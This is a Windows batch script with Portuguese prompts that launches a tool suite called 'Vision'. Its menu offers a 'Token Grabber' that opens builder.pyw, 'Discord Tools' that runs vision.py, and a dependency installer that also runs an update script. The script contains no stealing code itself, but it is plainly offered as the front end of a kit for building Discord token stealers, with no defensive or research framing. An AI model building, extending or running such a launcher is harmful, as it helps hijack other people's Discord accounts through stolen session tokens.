@echo off
chcp 65001 >nul
color 0C
cd /d "%~dp0"

title Vision Starter

echo.
echo  ██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗
echo  ██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║
echo  ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║
echo  ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║
echo  ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║
echo  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
echo.
echo  [1] Token Grabber
echo  [2] Discord Tools
echo  [3] Instalar dependencias
echo  [4] Sair
echo.
set /p choice=Escolha uma opcao (1/2/3/4): 

if /i "%choice%"=="1" (
    echo Abrindo Token Grabber...
    start "" "%~dp0builder.pyw"
    exit /b
)

if /i "%choice%"=="2" (
    echo Abrindo Discord Tools...
    py "%~dp0vision.py"
    exit /b
)

if /i "%choice%"=="3" (
    echo Verificando Python...
    py --version > nul 2>&1
    if errorlevel 1 (
        echo Python nao encontrado ou o launcher 'py' nao esta disponivel.
        echo Instale o Python e marque as opcoes Add Python to PATH e Py Launcher.
        pause >nul
        exit /b
    )

    echo Instalando dependencias...
    py -m pip install -r "%~dp0requirements.txt"

    if exist "%~dp0tools" (
        cd /d "%~dp0tools"
        echo Verificando atualizacoes...
        py update.py
    ) else (
        echo Pasta 'tools' nao encontrada. Pulando atualizacoes...
    )

    pause >nul
    exit /b
)

if /i "%choice%"=="4" (
    echo Saindo...
    exit /b
)

echo Opcao invalida!
pause >nul
